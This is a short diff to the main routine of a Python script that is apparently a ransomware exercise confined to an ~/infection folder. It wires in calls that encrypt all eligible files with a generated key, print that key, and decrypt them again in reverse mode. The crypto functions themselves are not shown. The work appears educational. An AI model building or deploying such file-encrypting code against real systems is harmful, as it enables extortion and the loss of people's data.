@@ -10,6 +10,7 @@ Do not use it with malicious intent.
 import sys
 from args import get_args
 from infection import get_infection_dir, get_target_files, get_encrypted_files
+from crypto import generate_key, encrypt_file, decrypt_file
 
 
 def main():
@@ -32,18 +33,25 @@ def main():
             return
         log(f"[~] Reverse mode — {len(files)} file(s) to decrypt.")
         for f in files:
-            log(f"    {f}")
-        # TODO: decryption logic will go here
+            decrypt_file(f, args.reverse, log)
+        log("[+] Done.")
 
     else:
         files = get_target_files(folder)
         if not files:
             log("[!] No eligible files found in ~/infection.")
             return
+
+        key = generate_key()
         log(f"[~] Encryption mode — {len(files)} file(s) to encrypt.")
+        log(f"[!] Save this key — you will need it to decrypt your files:")
+        log(f"    {key}")
+        log("")
+
         for f in files:
-            log(f"    {f}")
-        # TODO: encryption logic will go here
+            encrypt_file(f, key, log)
+
+        log("\n[+] Done.")
 
 
 if __name__ == "__main__":
